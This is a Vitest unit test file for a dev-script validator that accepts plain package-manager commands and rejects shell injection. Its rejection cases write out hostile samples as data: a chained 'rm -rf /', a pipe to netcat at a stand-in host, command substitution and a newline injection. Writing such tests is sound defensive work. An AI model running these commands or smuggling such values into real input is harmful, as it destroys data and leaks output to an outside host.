import { describe, it, expect } from 'vitest';
import { isValidDevScript } from '../../../src/main/services/devPanelService';

describe('isValidDevScript', () => {
  it('accepts safe package manager commands and script names', () => {
    expect(isValidDevScript('pnpm dev')).toBe(true);
    expect(isValidDevScript('npm test')).toBe(true);
    expect(isValidDevScript('yarn build')).toBe(true);
    expect(isValidDevScript('cargo run')).toBe(true);
    expect(isValidDevScript('python main.py')).toBe(true);
    expect(isValidDevScript('dev')).toBe(true);
    expect(isValidDevScript('test:unit')).toBe(true);
    expect(isValidDevScript('build-assets')).toBe(true);
  });

  it('rejects shell injection attempts with metacharacters', () => {
    expect(isValidDevScript('npm dev; rm -rf /')).toBe(false);
    expect(isValidDevScript('pnpm run dev && echo hacked')).toBe(false);
    expect(isValidDevScript('yarn test | nc mal.site 1337')).toBe(false);
    expect(isValidDevScript('cargo run $(whoami)')).toBe(false);
    expect(isValidDevScript('python main.py `id`')).toBe(false);
    expect(isValidDevScript('dev > /tmp/out')).toBe(false);
    expect(isValidDevScript('build\nmalicious')).toBe(false);
  });

  it('rejects empty or invalid input', () => {
    expect(isValidDevScript('')).toBe(false);
    expect(isValidDevScript('   ')).toBe(false);
  });
});
